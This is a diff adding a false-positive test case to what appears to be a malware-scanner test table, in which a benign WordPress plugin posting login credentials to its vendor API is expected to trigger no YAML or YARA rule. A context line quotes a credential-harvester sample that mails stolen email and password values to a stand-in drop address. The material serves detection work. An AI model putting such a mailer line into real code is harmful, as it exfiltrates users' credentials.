@@ -2103,6 +2103,23 @@ mail('drop@collector.example.test', 'result', "$e|$p");`,
 			wantYARAHit: true,
 		},
 		{
+			name:     "plugin signing in to its vendor cloud account",
+			yamlRule: "credential_mailer",
+			yaraRule: "credential_harvester_php",
+			ext:      ".php",
+			// Both credential fields are posted and the only "mail(" in the
+			// file is the tail of an identifier. Neither engine may fire.
+			sample: `<?php
+public function get_user_email() { return sanitize_email( $this->user_email ); }
+public function connect() {
+	$email    = isset( $_POST['email'] ) ? sanitize_email( wp_unslash( $_POST['email'] ) ) : '';
+	$password = isset( $_POST['password'] ) ? $_POST['password'] : '';
+	return wp_remote_post( $this->api . '/login', array( 'email' => $email, 'password' => $password ) );
+}`,
+			wantYAMLHit: false,
+			wantYARAHit: false,
+		},
+		{
 			name:        "hidden pharmacy doorway",
 			yamlRule:    "spam_pharma_generic",
 			yaraRule:    "spam_pharma",
